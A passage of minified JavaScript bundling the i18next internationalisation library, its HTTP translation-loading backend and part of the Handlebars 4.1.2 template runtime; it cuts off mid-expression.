asap.'),this.options=n({},{debug:!1,initImmediate:!0,ns:["translation"],defaultNS:["translation"],fallbackLng:["dev"],fallbackNS:!1,whitelist:!1,nonExplicitWhitelist:!1,supportedLngs:!1,nonExplicitSupportedLngs:!1,load:"all",preload:!1,simplifyPluralSuffix:!0,keySeparator:".",nsSeparator:":",pluralSeparator:"_",contextSeparator:"_",partialBundledLanguages:!1,saveMissing:!1,updateMissing:!1,saveMissingTo:"fallback",saveMissingPlurals:!0,missingKeyHandler:!1,missingInterpolationHandler:!1,postProcess:!1,postProcessPassResolved:!1,returnNull:!0,returnEmptyString:!0,returnObjects:!1,joinArrays:!1,returnedObjectHandler:!1,parseMissingKeyHandler:!1,appendNamespaceToMissingKey:!1,appendNamespaceToCIMode:!1,overloadTranslationOptionHandler:function(e){var n={};if("object"===t(e[1])&&(n=e[1]),"string"==typeof e[1]&&(n.defaultValue=e[1]),"string"==typeof e[2]&&(n.tDescription=e[2]),"object"===t(e[2])||"object"===t(e[3])){var i=e[3]||e[2];Object.keys(i).forEach((function(t){n[t]=i[t]}))}return n},interpolation:{escapeValue:!0,format:function(t,e,n,i){return t},prefix:"{{",suffix:"}}",formatSeparator:",",unescapePrefix:"-",nestingPrefix:"$t(",nestingSuffix:")",nestingOptionsSeparator:",",maxReplaces:1e3,skipOnVariables:!1}},this.options,B(i)),this.format=this.options.interpolation.format,r||(r=D),!this.options.isClone){this.modules.logger?h.init(o(this.modules.logger),this.options):h.init(null,this.options);var s=new L(this.options);this.store=new S(this.options.resources,this.options);var a=this.services;a.logger=h,a.resourceStore=this.store,a.languageUtils=s,a.pluralResolver=new A(s,{prepend:this.options.pluralSeparator,compatibilityJSON:this.options.compatibilityJSON,simplifyPluralSuffix:this.options.simplifyPluralSuffix}),a.interpolator=new P(this.options),a.utils={hasLoadedNamespace:this.hasLoadedNamespace.bind(this)},a.backendConnector=new N(o(this.modules.backend),a.resourceStore,a,this.options),a.backendConnector.on("*",(function(t){for(var n=arguments.length,i=new Array(n>1?n-1:0),r=1;r<n;r++)i[r-1]=arguments[r];e.emit.apply(e,[t].concat(i))})),this.modules.languageDetector&&(a.languageDetector=o(this.modules.languageDetector),a.languageDetector.init(a,this.options.detection,this.options)),this.modules.i18nFormat&&(a.i18nFormat=o(this.modules.i18nFormat),a.i18nFormat.init&&a.i18nFormat.init(this)),this.translator=new E(this.services,this.options),this.translator.on("*",(function(t){for(var n=arguments.length,i=new Array(n>1?n-1:0),r=1;r<n;r++)i[r-1]=arguments[r];e.emit.apply(e,[t].concat(i))})),this.modules.external.forEach((function(t){t.init&&t.init(e)}))}this.modules.languageDetector||this.options.lng||this.logger.warn("init: no languageDetector is used and no lng is defined"),["getResource","addResource","addResources","addResourceBundle","removeResourceBundle","hasResourceBundle","getResourceBundle","getDataByLanguage"].forEach((function(t){e[t]=function(){var n;return(n=e.store)[t].apply(n,arguments)}}));var l=p(),c=function(){e.changeLanguage(e.options.lng,(function(t,n){e.isInitialized=!0,e.logger.log("initialized",e.options),e.emit("initialized",e.options),l.resolve(n),r(t,n)}))};return this.options.resources||!this.options.initImmediate?c():setTimeout(c,0),l}},{key:"loadResources",value:function(t){var e=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:D,i="string"==typeof t?t:this.language;if("function"==typeof t&&(n=t),!this.options.resources||this.options.partialBundledLanguages){if(i&&"cimode"===i.toLowerCase())return n();var r=[],o=function(t){t&&e.services.languageUtils.toResolveHierarchy(t).forEach((function(t){r.indexOf(t)<0&&r.push(t)}))};i?o(i):this.services.languageUtils.getFallbackCodes(this.options.fallbackLng).forEach((function(t){return o(t)})),this.options.preload&&this.options.preload.forEach((function(t){return o(t)})),this.services.backendConnector.load(r,this.options.ns,n)}else n(null)}},{key:"reloadResources",value:function(t,e,n){var i=p();return t||(t=this.languages),e||(e=this.options.ns),n||(n=D),this.services.backendConnector.reload(t,e,(function(t){i.resolve(),n(t)})),i}},{key:"use",value:function(t){if(!t)throw new Error("You are passing an undefined module! Please check the object you are passing to i18next.use()");if(!t.type)throw new Error("You are passing a wrong module! Please check the object you are passing to i18next.use()");return"backend"===t.type&&(this.modules.backend=t),("logger"===t.type||t.log&&t.warn&&t.error)&&(this.modules.logger=t),"languageDetector"===t.type&&(this.modules.languageDetector=t),"i18nFormat"===t.type&&(this.modules.i18nFormat=t),"postProcessor"===t.type&&C.addPostProcessor(t),"3rdParty"===t.type&&this.modules.external.push(t),this}},{key:"changeLanguage",value:function(t,e){var n=this;this.isLanguageChangingTo=t;var i=p();this.emit("languageChanging",t);var r=function(t){var r="string"==typeof t?t:n.services.languageUtils.getBestMatchFromCodes(t);r&&(n.language||(n.language=r,n.languages=n.services.languageUtils.toResolveHierarchy(r)),n.translator.language||n.translator.changeLanguage(r),n.services.languageDetector&&n.services.languageDetector.cacheUserLanguage(r)),n.loadResources(r,(function(t){!function(t,r){r?(n.language=r,n.languages=n.services.languageUtils.toResolveHierarchy(r),n.translator.changeLanguage(r),n.isLanguageChangingTo=void 0,n.emit("languageChanged",r),n.logger.log("languageChanged",r)):n.isLanguageChangingTo=void 0,i.resolve((function(){return n.t.apply(n,arguments)})),e&&e(t,(function(){return n.t.apply(n,arguments)}))}(t,r)}))};return t||!this.services.languageDetector||this.services.languageDetector.async?!t&&this.services.languageDetector&&this.services.languageDetector.async?this.services.languageDetector.detect(r):r(t):r(this.services.languageDetector.detect()),i}},{key:"getFixedT",value:function(e,i){var r=this,o=function e(i,o){var s;if("object"!==t(o)){for(var a=arguments.length,l=new Array(a>2?a-2:0),c=2;c<a;c++)l[c-2]=arguments[c];s=r.options.overloadTranslationOptionHandler([i,o].concat(l))}else s=n({},o);return s.lng=s.lng||e.lng,s.lngs=s.lngs||e.lngs,s.ns=s.ns||e.ns,r.t(i,s)};return"string"==typeof e?o.lng=e:o.lngs=e,o.ns=i,o}},{key:"t",value:function(){var t;return this.translator&&(t=this.translator).translate.apply(t,arguments)}},{key:"exists",value:function(){var t;return this.translator&&(t=this.translator).exists.apply(t,arguments)}},{key:"setDefaultNamespace",value:function(t){this.options.defaultNS=t}},{key:"hasLoadedNamespace",value:function(t){var e=this,n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};if(!this.isInitialized)return this.logger.warn("hasLoadedNamespace: i18next was not initialized",this.languages),!1;if(!this.languages||!this.languages.length)return this.logger.warn("hasLoadedNamespace: i18n.languages were undefined or empty",this.languages),!1;var i=this.languages[0],r=!!this.options&&this.options.fallbackLng,o=this.languages[this.languages.length-1];if("cimode"===i.toLowerCase())return!0;var s=function(t,n){var i=e.services.backendConnector.state["".concat(t,"|").concat(n)];return-1===i||2===i};if(n.precheck){var a=n.precheck(this,s);if(void 0!==a)return a}return!!this.hasResourceBundle(i,t)||!this.services.backendConnector.backend||!(!s(i,t)||r&&!s(o,t))}},{key:"loadNamespaces",value:function(t,e){var n=this,i=p();return this.options.ns?("string"==typeof t&&(t=[t]),t.forEach((function(t){n.options.ns.indexOf(t)<0&&n.options.ns.push(t)})),this.loadResources((function(t){i.resolve(),e&&e(t)})),i):(e&&e(),Promise.resolve())}},{key:"loadLanguages",value:function(t,e){var n=p();"string"==typeof t&&(t=[t]);var i=this.options.preload||[],r=t.filter((function(t){return i.indexOf(t)<0}));return r.length?(this.options.preload=i.concat(r),this.loadResources((function(t){n.resolve(),e&&e(t)})),n):(e&&e(),Promise.resolve())}},{key:"dir",value:function(t){return t||(t=this.languages&&this.languages.length>0?this.languages[0]:this.language),t?["ar","shu","sqr","ssh","xaa","yhd","yud","aao","abh","abv","acm","acq","acw","acx","acy","adf","ads","aeb","aec","afb","ajp","apc","apd","arb","arq","ars","ary","arz","auz","avl","ayh","ayl","ayn","ayp","bbz","pga","he","iw","ps","pbt","pbu","pst","prp","prd","ug","ur","ydd","yds","yih","ji","yi","hbo","men","xmn","fa","jpr","peo","pes","prs","dv","sam"].indexOf(this.services.languageUtils.getLanguagePartFromCode(t))>=0?"rtl":"ltr":"rtl"}},{key:"createInstance",value:function(){return new r(arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},arguments.length>1?arguments[1]:void 0)}},{key:"cloneInstance",value:function(){var t=this,e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},i=arguments.length>1&&void 0!==arguments[1]?arguments[1]:D,o=n({},this.options,e,{isClone:!0}),s=new r(o);return["store","services","language"].forEach((function(e){s[e]=t[e]})),s.services=n({},this.services),s.services.utils={hasLoadedNamespace:s.hasLoadedNamespace.bind(s)},s.translator=new E(s.services,s.options),s.translator.on("*",(function(t){for(var e=arguments.length,n=new Array(e>1?e-1:0),i=1;i<e;i++)n[i-1]=arguments[i];s.emit.apply(s,[t].concat(n))})),s.init(o,i),s.translator.options=s.options,s.translator.backendConnector.services.utils={hasLoadedNamespace:s.hasLoadedNamespace.bind(s)},s}}]),r}())})),function(t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).i18nextHttpBackend=t()}((function(){return function t(e,n,i){function r(s,a){if(!n[s]){if(!e[s]){var l="function"==typeof require&&require;if(!a&&l)return l(s,!0);if(o)return o(s,!0);var c=new Error("Cannot find module '"+s+"'");throw c.code="MODULE_NOT_FOUND",c}var u=n[s]={exports:{}};e[s][0].call(u.exports,(function(t){return r(e[s][1][t]||t)}),u,u.exports,t,e,n,i)}return n[s].exports}for(var o="function"==typeof require&&require,s=0;s<i.length;s++)r(i[s]);return r}({1:[function(t,e,n){(function(i){var r,o;"function"==typeof fetch&&(void 0!==i&&i.fetch?r=i.fetch:"undefined"!=typeof window&&window.fetch&&(r=window.fetch)),void 0===t||"undefined"!=typeof window&&void 0!==window.document||((o=r||t("node-fetch")).default&&(o=o.default),n.default=o,e.exports=n.default)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"node-fetch":5}],2:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.default=void 0;var i,r=t("./utils.js"),o=(i=t("./request.js"))&&i.__esModule?i:{default:i};function s(t,e){for(var n=0;n<e.length;n++){var i=e[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function a(){return{loadPath:"/locales/{{lng}}/{{ns}}.json",addPath:"/locales/add/{{lng}}/{{ns}}",allowMultiLoading:!1,parse:function(t){return JSON.parse(t)},stringify:JSON.stringify,parsePayload:function(t,e,n){return o=n||"",(r=e)in(i={})?Object.defineProperty(i,r,{value:o,enumerable:!0,configurable:!0,writable:!0}):i[r]=o,i;var i,r,o},request:o.default,reloadInterval:!1,customHeaders:{},queryStringParams:{},crossDomain:!1,withCredentials:!1,overrideMimeType:!1,requestOptions:{mode:"cors",credentials:"same-origin",cache:"default"}}}var l,c,u=(l=d,(c=[{key:"init",value:function(t,e,n){var i=this,o=1<arguments.length&&void 0!==e?e:{},s=2<arguments.length&&void 0!==n?n:{};this.services=t,this.options=(0,r.defaults)(o,this.options||{},a()),this.allOptions=s,this.options.reloadInterval&&setInterval((function(){return i.reload()}),this.options.reloadInterval)}},{key:"readMulti",value:function(t,e,n){var i=this.options.loadPath;"function"==typeof this.options.loadPath&&(i=this.options.loadPath(t,e));var r=this.services.interpolator.interpolate(i,{lng:t.join("+"),ns:e.join("+")});this.loadUrl(r,n,t,e)}},{key:"read",value:function(t,e,n){var i=this.options.loadPath;"function"==typeof this.options.loadPath&&(i=this.options.loadPath([t],[e]));var r=this.services.interpolator.interpolate(i,{lng:t,ns:e});this.loadUrl(r,n,t,e)}},{key:"loadUrl",value:function(t,e,n,i){var r=this;this.options.request(this.options,t,void 0,(function(o,s){if(s&&500<=s.status&&s.status<600)return e("failed loading "+t,!0);if(s&&400<=s.status&&s.status<500)return e("failed loading "+t,!1);if(o)return e(o,!1);var a,l;try{a="string"==typeof s.data?r.options.parse(s.data,n,i):s.data}catch(o){l="failed parsing "+t+" to json"}if(l)return e(l,!1);e(null,a)}))}},{key:"create",value:function(t,e,n,i){var r,o=this;this.options.addPath&&("string"==typeof t&&(t=[t]),r=this.options.parsePayload(e,n,i),t.forEach((function(t){var n=o.services.interpolator.interpolate(o.options.addPath,{lng:t,ns:e});o.options.request(o.options,n,r,(function(t,e){}))})))}},{key:"reload",value:function(){var t,e,n=this,i=this.services,r=i.backendConnector,o=i.languageUtils,s=i.logger,a=r.language;a&&"cimode"===a.toLowerCase()||(t=[],(e=function(e){o.toResolveHierarchy(e).forEach((function(e){t.indexOf(e)<0&&t.push(e)}))})(a),this.allOptions.preload&&this.allOptions.preload.forEach(e),t.forEach((function(t){n.allOptions.ns.forEach((function(e){r.read(t,e,"read",null,null,(function(n,i){n&&s.warn("loading namespace ".concat(e," for language ").concat(t," failed"),n),!n&&i&&s.log("loaded namespace ".concat(e," for language ").concat(t),i),r.loaded("".concat(t,"|").concat(e),n,i)}))}))})))}}])&&s(l.prototype,c),d);function d(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},n=2<arguments.length&&void 0!==arguments[2]?arguments[2]:{};!function(t,e){if(!(t instanceof e))throw new TypeError("Cannot call a class as a function")}(this,d),this.services=t,this.options=e,this.allOptions=n,this.type="backend",this.init(t,e,n)}u.type="backend",n.default=u,e.exports=n.default},{"./request.js":3,"./utils.js":4}],3:[function(t,e,n){(function(i){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.default=void 0;var r,o,s,a=t("./utils.js"),l=function(t){if(t&&t.__esModule)return t;if(null===t||"object"!==u(t)&&"function"!=typeof t)return{default:t};var e=c();if(e&&e.has(t))return e.get(t);var n={},i=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var r in t){var o;Object.prototype.hasOwnProperty.call(t,r)&&((o=i?Object.getOwnPropertyDescriptor(t,r):null)&&(o.get||o.set)?Object.defineProperty(n,r,o):n[r]=t[r])}return n.default=t,e&&e.set(t,n),n}(t("./getFetch.js"));function c(){if("function"!=typeof WeakMap)return null;var t=new WeakMap;return c=function(){return t},t}function u(t){return(u="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(t){return typeof t}:function(t){return t&&"function"==typeof Symbol&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t})(t)}function d(t,e){if(e&&"object"===u(e)){var n="";for(var i in e)n+="&"+encodeURIComponent(i)+"="+encodeURIComponent(e[i]);if(!n)return t;t=t+(-1!==t.indexOf("?")?"&":"?")+n.slice(1)}return t}"function"==typeof fetch&&(void 0!==i&&i.fetch?r=i.fetch:"undefined"!=typeof window&&window.fetch&&(r=window.fetch)),"function"==typeof XMLHttpRequest&&(void 0!==i&&i.XMLHttpRequest?o=i.XMLHttpRequest:"undefined"!=typeof window&&window.XMLHttpRequest&&(o=window.XMLHttpRequest)),"function"==typeof ActiveXObject&&(void 0!==i&&i.ActiveXObject?s=i.ActiveXObject:"undefined"!=typeof window&&window.ActiveXObject&&(s=window.ActiveXObject)),r||!l||o||s||(r=l.default||l),"function"!=typeof r&&(r=void 0),n.default=function(t,e,n,i){return"function"==typeof n&&(i=n,n=void 0),i=i||function(){},r?function(t,e,n,i){t.queryStringParams&&(e=d(e,t.queryStringParams));var o=(0,a.defaults)({},t.customHeaders);n&&(o["Content-Type"]="application/json"),r(e,(0,a.defaults)({method:n?"POST":"GET",body:n?t.stringify(n):void 0,headers:o},"function"==typeof t.requestOptions?t.requestOptions(n):t.requestOptions)).then((function(t){return t.ok?void t.text().then((function(e){i(null,{status:t.status,data:e})})).catch(i):i(t.statusText||"Error",{status:t.status})})).catch(i)}(t,e,n,i):"function"==typeof XMLHttpRequest||"function"==typeof ActiveXObject?function(t,e,n,i){n&&"object"===u(n)&&(n=d("",n).slice(1)),t.queryStringParams&&(e=d(e,t.queryStringParams));try{var r=o?new o:new s("MSXML2.XMLHTTP.3.0");r.open(n?"POST":"GET",e,1),t.crossDomain||r.setRequestHeader("X-Requested-With","XMLHttpRequest"),r.withCredentials=!!t.withCredentials,n&&r.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),r.overrideMimeType&&r.overrideMimeType("application/json");var a=t.customHeaders;if(a="function"==typeof a?a():a)for(var l in a)r.setRequestHeader(l,a[l]);r.onreadystatechange=function(){3<r.readyState&&i(400<=r.status?r.statusText:null,{status:r.status,data:r.responseText})},r.send(n)}catch(t){console&&console.log(t)}}(t,e,n,i):void 0},e.exports=n.default}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"./getFetch.js":1,"./utils.js":4}],4:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0}),n.defaults=function(t){return r.call(o.call(arguments,1),(function(e){if(e)for(var n in e)void 0===t[n]&&(t[n]=e[n])})),t};var i=[],r=i.forEach,o=i.slice},{}],5:[function(t,e,n){},{}]},{},[2])(2)})),function(t,e){"object"==typeof exports&&"object"==typeof module?module.exports=e():"function"==typeof define&&define.amd?define([],e):"object"==typeof exports?exports.Handlebars=e():t.Handlebars=e()}(this,(function(){return function(t){function e(i){if(n[i])return n[i].exports;var r=n[i]={exports:{},id:i,loaded:!1};return t[i].call(r.exports,r,r.exports,e),r.loaded=!0,r.exports}var n={};return e.m=t,e.c=n,e.p="",e(0)}([function(t,e,n){"use strict";function i(){var t=h();return t.compile=function(e,n){return l.compile(e,n,t)},t.precompile=function(e,n){return l.precompile(e,n,t)},t.AST=s.default,t.Compiler=l.Compiler,t.JavaScriptCompiler=c.default,t.Parser=a.parser,t.parse=a.parse,t}var r=n(1).default;e.__esModule=!0;var o=r(n(2)),s=r(n(35)),a=n(36),l=n(41),c=r(n(42)),u=r(n(39)),d=r(n(34)),h=o.default.create,f=i();f.create=i,d.default(f),f.Visitor=u.default,f.default=f,e.default=f,t.exports=e.default},function(t,e){"use strict";e.default=function(t){return t&&t.__esModule?t:{default:t}},e.__esModule=!0},function(t,e,n){"use strict";function i(){var t=new s.HandlebarsEnvironment;return c.extend(t,s),t.SafeString=a.default,t.Exception=l.default,t.Utils=c,t.escapeExpression=c.escapeExpression,t.VM=u,t.template=function(e){return u.template(e,t)},t}var r=n(3).default,o=n(1).default;e.__esModule=!0;var s=r(n(4)),a=o(n(21)),l=o(n(6)),c=r(n(5)),u=r(n(22)),d=o(n(34)),h=i();h.create=i,d.default(h),h.default=h,e.default=h,t.exports=e.default},function(t,e){"use strict";e.default=function(t){if(t&&t.__esModule)return t;var e={};if(null!=t)for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n]);return e.default=t,e},e.__esModule=!0},function(t,e,n){"use strict";function i(t,e,n){this.helpers=t||{},this.partials=e||{},this.decorators=n||{},a.registerDefaultHelpers(this),l.registerDefaultDecorators(this)}var r=n(1).default;e.__esModule=!0,e.HandlebarsEnvironment=i;var o=n(5),s=r(n(6)),a=n(10),l=n(18),c=r(n(20));e.VERSION="4.1.2";e.COMPILER_REVISION=7;e.REVISION_CHANGES={1:"<= 1.0.rc.2",2:"== 1.0.0-rc.3",3:"== 1.0.0-rc.4",4:"== 1.x.x",5:"== 2.0.0-alpha.x",6:">= 2.0.0-beta.1",7:">= 4.0.0"};var u="[object Object]";i.prototype={constructor:i,logger:c.default,log:c.default.log,registerHelper:function(t,e){if(o.toString.call(t)===u){if(e)throw new s.default("Arg not supported with multiple helpers");o.extend(this.helpers,t)}else this.helpers[t]=e},unregisterHelper:function(t){delete this.helpers[t]},registerPartial:function(t,e){if(o.toString.call(t)===u)o.extend(this.partials,t);else{if(void 0===e)throw new s.default('Attempting to register a partial called "'+t+'" as undefined');this.partials[t]=e}},unregisterPartial:function(t){delete this.partials[t]},registerDecorator:function(t,e){if(o.toString.call(t)===u){if(e)throw new s.default("Arg not supported with multiple decorators");o.extend(this.decorators,t)}else this.decorators[t]=e},unregisterDecorator:function(t){delete this.decorators[t]}};var d=c.default.log;e.log=d,e.createFrame=o.createFrame,e.logger=c.default},function(t,e){"use strict";function n(t){return r[t]}function i(t){for(var e=1;e<arguments.length;e++)for(var n in arguments[e])Object.prototype.hasOwnProperty.call(arguments[e],n)&&(t[n]=arguments[e][n]);return t}e.__esModule=!0,e.extend=i,e.indexOf=function(t,e){for(var n=0,i=t.length;n<i;n++)if(t[n]===e)return n;return-1},e.escapeExpression=function(t){if("string"!=typeof t){if(t&&t.toHTML)return t.toHTML();if(null==t)return"";if(!t)return t+"";t=""+t}return s.test(t)?t.replace(o,n):t},e.isEmpty=function(t){return!t&&0!==t||!(!c(t)||0!==t.length)},e.createFrame=function(t){var e=i({},t);return e._parent=t,e},e.blockParams=function(t,e){return t.path=e,t},e.appendContextPath=function(t,e){return(t?t+".":"")+e};var r={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#x27;","`":"&#x60;","=":"&#x3D;"},o=/[&<>"'`=]/g,s=/[&<>"'`=]/,a=Object.prototype.toString;e.toString=a;var l=function(t){return"function"==typeof t};l(/x/)&&(e.isFunction=l=function(t){return"function"==typeof t&&"[object Function]"===a.call(t)}),e.isFunction=l;var c=Array.isArray||function(t){return!(!t||"object"!=typeof t)&&"[object Array]"===a.call(t)};e.isArray=c},function(t,e,n){"use strict";function i(t,e){var n=e&&e.loc,s=void 0,a=void 0;n&&(t+=" - "+(s=n.start.line)+":"+(a=n.start.column));for(var l=Error.prototype.constructor.call(this,t),c=0;c<o.length;c++)this[o[c]]=l[o[c]];Error.captureStackTrace&&Error.captureStackTrace(this,i);try{n&&(this.lineNumber=s,r?Object.defineProperty(this,"column",{value:a,enumerable:!0}):this.column=a)}catch(t){}}var r=n(7).default;e.__esModule=!0;var o=["description","fileName","lineNumber","message","name","number","stack"];i.prototype=new Error,e.default=i,t.exports=e.default},function(t,e,n){t.exports={default:n(8),__esModule:!0}},function(t,e,n){var i=n(9);t.exports=function(t,e,n){return i.setDesc(t,e,n)}},function(t,e){var n=Object;t.exports={create:n.create,getProto:n.getPrototypeOf,isEnum:{}.propertyIsEnumerable,getDesc:n.getOwnPropertyDescriptor,setDesc:n.defineProperty,setDescs:n.defineProperties,getKeys:n.keys,getNames:n.getOwnPropertyNames,getSymbols:n.getOwnPropertySymbols,each:[].forEach}},function(t,e,n){"use strict";var i=n(1).default;e.__esModule=!0,e.registerDefaultHelpers=function(t){r.default(t),o.default(t),s.default(t),a.default(t),l.default(t),c.default(t),u.default(t)};var r=i(n(11)),o=i(n(12)),s=i(n(13)),a=i(n(14)),l=i(n(15)),c=i(n(16)),u=i(n(17))},function(t,e,n){"use strict";e.__esModule=!0;var i=n(5);e.default=function(t){t.registerHelper("blockHelperMissing",(function(e,n){var r=n.inverse,o=n.fn;if(!0===e)return o(this);if(!1===e||null==e)return r(this);if(i.isArray(e))return e.length>0?(n.ids&&(n.ids=[n.name]),t.helpers.each(e,n)):r(this);if(n.data&&n.ids){var s=i.createFrame(n.data);s.contextPath=i.appendContextPath(n.data.contextPath,n.name),n={data:s}}return o(e,n)}))},t.exports=e.default},function(t,e,n){"use strict";var i=n(1).default;e.__esModule=!0;var r=n(5),o=i(n(6));e.default=function(t){t.registerHelper("each",(function(t,e){function n(e,n,o){c&&(c.key=e,c.index=n,c.first=0===n,c.last=!!o,u&&(c.contextPath=u+e)),l+=i(t[e],{data:c,blockParams:r.blockParams([t[e],e],[u+e,null])})}if(!e)throw new o.default("Must pass iterator to #each");var i=e.fn,s=e.inverse,a=0,l="",c=void 0,u=void 0;if(e.data&&e.ids&&(u=r.appendContextPath(e.data.contextPath,e.ids[0])+"."),r.isFunction(t)&&(t=t.call(this)),e.data&&(c=r.createFrame(e.data)),t&&"object"==typeof t)if(r.isArray(t))for(var d=t.length;a<d;a++)a in t&&n(a,a,a===t.length-1);else{var h=void 0;for(var f in t)t.hasOwnProperty(f)&&(void 0!==h&&n(h,a-1),h=f,a++);void 0!==h&&n(h,a-1,!0)}return 0===a&&(l=s(this)),l}))},t.exports=e.default},function(t,e,n){"use strict";var i=n(1).default;e.__esModule=!0;var r=i(n(6));e.default=function(t){t.registerHelper("helperMissing",(function(){if(1!==arguments.length)throw new r.default('Missing helper: "'+arguments[arguments.length-1].name+'"')}))},t.exports=e.default},function(t,e,n){"use strict";e.__esModule=!0;var i=n(5);e.default=function(t){t.registerHelper("if",(function(t,e){return i.isFunction(t)&&(t=t.call(this)),!e.hash.includeZero&&!t||i.isEmpty(t)?e.inverse(this):e.fn(this)})),t.registerHelper("unless",(function(e,n){return t.helpers.if.call(this,e,{fn:n.inverse,inverse:n.fn,hash:n.hash})}))},t.exports=e.default},function(t,e){"use strict";e.__esModule=!0,e.default=function(t){t.registerHelper("log",(function(){for(var e=[void 0],n=arguments[arguments.length-1],i=0;i<arguments.length-1;i++)e.push(arguments[i]);var r=1;null!=n.hash.level?r=n.hash.level:n.data&&null!=n.data.level&&(r=n.data.level),e[0]=r,t.log.apply(t,e)}))},t.exports=e.default},function(t,e){"use strict";e.__esModule=!0,e.default=function(t){t.registerHelper("lookup",(function(t,e){return t?"constructor"!==e||t.propertyIsEnumerable(e)?t[e]:void 0:t}))},t.exports=e.default},function(t,e,n){"use strict";e.__esModule=!0;var i=n(5);e.default=function(t){t.registerHelper("with",(function(t,e){i.isFunction(t)&&(t=t.call(this));var n=e.fn;if(i.isEmpty(t))return e.inverse(this);var r=e.data;return e.data&&e.ids&&((r=i.createFrame(e.data)).contextPath=i.appendContextPath(e.data.contextPath,e.ids[0])),n(t,{data:r,blockParams:i.blockParams([t],[r&&r.contextPath])})}))},t.exports=e.default},function(t,e,n){"use strict";var i=n(1).default;e.__esModule=!0,e.registerDefaultDecorators=function(t){r.default(t)};var r=i(n(19))},function(t,e,n){"use strict";e.__esModule=!0;var i=n(5);e.default=function(t){t.registerDecorator("inline",(function(t,e,n,r){var o=t;return e.partials||(e.partials={},o=function(r,o){var s=n.partials;n.partials=i.extend({},s,e.partials);var a=t(r,o);return n.partials=s,a}),e.partials[r.args[0]]=r.fn,o}))},t.exports=e.default},function(t,e,n){"use strict";e.__esModule=!0;var i=n(5),r={methodMap:["debug","info","warn","error"],level:"info",lookupLevel:function(t){if("string"==typeof t){var e=i.indexOf(r.methodMap,t.toLowerCase());t=e>=0?e:parseInt(t,10)}return t},log:function(t){if(t=r.lookupLevel(t),"undefined"!=typeof console&&r.lookupLevel(r.level)<=t){var e=r.methodMap[t];console[e]||(e="log");for(var n=arguments.length,i=Array(n>1?n-1:0),o=1;o<n;o++)i[o-1]=arguments[o];console[e].apply(console,i)}}};e.default=r,t.exports=e.default},function(t,e){"use strict";function n(t){this.string=t}e.__esModule=!0,n.prototype.toString=n.prototype.toHTML=function(){return""+this.string},e.default=n,t.exports=e.default},function(t,e,n){"use strict";function i(t,e,n,i,r,s,a){function l(e){var r=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],o=a;return!a||e==a[0]||e===t.nullContext&&null===a[0]||(o=[e].concat(a)),n(t,e,t.helpers,t.partials,r.data||i,s&&[r.blockParams].concat(s),o)}return(l=o(n,l,t,a,i,s)).program=e,l.depth=a?a.length:0,l.blockParams=r||0,l}function r(){return""}function o(t,e,n,i,r,o){if(t.decorator){var s={};e=t.decorator(e,s,n,i&&i[0],r,o,i),c.extend(e,s)}return e}var s=n(23).default,a=n(3).default,l=n(1).default;e.__esModule=!0,e.checkRevision=function(t){var e=t&&t[0]||1,n=d.COMPILER_REVISION;if(e!==n){if(e<n){var i=d.REVISION_CHANGES[n],r=d.REVISION_CHANGES[e];throw new u.default("Template was precompiled with an older version of Handlebars than the current runtime. Please update your precompiler to a newer version ("+i+") or downgrade your runtime to an older version ("+r+").")}throw new u.default("Template was precompiled with a newer version of Handlebars than the current runtime. Please update your runtime to a newer version ("+t[1]+").")}},e.template=function(t,e){function n(e){function i(e){return""+t.main(r,e,r.helpers,r.partials,a,c,l)}var s=arguments.length<=1||void 0===arguments[1]?{}:arguments[1],a=s.data;n._setup(s),!s.partial&&t.useData&&(a=function(t,e){return e&&"root"in e||(e=e?d.createFrame(e):{},e.root=t),e}(e,a));var l=void 0,c=t.useBlockParams?[]:void 0;return t.useDepths&&(l=s.depths?e!=s.depths[0]?[e].concat(s.depths):s.depths:[e]),(i=o(t.main,i,r,s.depths||[],a,c))(e,s)}if(!e)throw new u.default("No environment passed to template");if(!t||!t.main)throw new u.default("Unknown template object: "+typeof t);t.main.decorator=t.main_d,e.VM.checkRevision(t.compiler);var r={strict:function(t,e){if(!(e in t))throw new u.default('"'+e+'" not defined in '+t);return t[e]},lookup:function(t,e){for(var n=t.length,i=0;i<n;i++)if(t[i]&&null!=t[i][e])return t[i][e]},lambda:function(t,e){return"function"==typeof t?t.call(e):t},escapeExpression:c.escapeExpression,invokePartial:function(n,i,r){r.hash&&(i=c.extend({},i,r.hash),r.ids&&(r.ids[0]=!0)),n=e.VM.resolvePartial.call(this,n,i,r);var o=e.VM.invokePartial.call(this,n,i,r);if(null==o&&e.compile&&(r.partials[r.name]=e.compile(n,t.compilerOptions,e),o=r.partials[r.name](i,r)),null!=o){if(r.indent){for(var s=o.split("\n"),a=0,l=s.length;a<l&&(s[a]||a+1!==l);a++)s[a]=r.indent+s[a];o=s.join("\n")}return o}throw new u.default("The partial "+r.name+" could not be compiled when running in runtime-only mode")},fn:function(e){var n=t[e];return n.decorator=t[e+"_d"],n},programs:[],program:function(t,e,n,r,o){var s=this.programs[t],a=this.fn(t);return e||o||r||n?s=i(this,t,a,e,n,r,o):s||(s=this.programs[t]=i(this,t,a)),s},data:function(t,e){for(;t&&e--;)t=t._parent;return t},merge:function(t,e){var n=t||e;return t&&e&&t!==e&&(n=c.extend({},e,t)),n},nullContext:s({}),noop:e.VM.noop,compilerInfo:t.compiler};return 